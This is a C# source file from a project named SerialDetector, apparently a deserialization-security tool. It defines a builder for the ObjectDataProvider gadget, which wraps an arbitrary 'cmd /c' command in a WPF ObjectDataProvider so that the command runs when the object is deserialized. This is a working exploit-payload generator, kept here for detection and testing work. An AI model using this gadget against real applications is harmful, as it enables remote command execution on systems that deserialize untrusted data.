using System.Collections.Specialized;
using System.Diagnostics;
using System.Reflection;

namespace SerialDetector.KnowledgeBase.Gadgets
{
    // ObjectDataProvider gadget by Oleksandr Mirosh and Alvaro Munoz
    internal class ObjectDataProvider : IGadget
    {
        public object Build(string command)
        {
            var startInfo = new ProcessStartInfo
            {
                FileName = "cmd", 
                Arguments = $"/c {command}"
            };
            
            var dictionary = new StringDictionary();
            // ReSharper disable once PossibleNullReferenceException
            startInfo.GetType()
                .GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic)
                .SetValue(startInfo, dictionary);
            
            var process = new Process
            {
                StartInfo = startInfo
            };

            var objectDataProvider = new System.Windows.Data.ObjectDataProvider
            {
                MethodName = "Start",
                IsInitialLoadEnabled = false,
                ObjectInstance = process
            };

            objectDataProvider.IsInitialLoadEnabled = true;
            return objectDataProvider;
        }
    }
}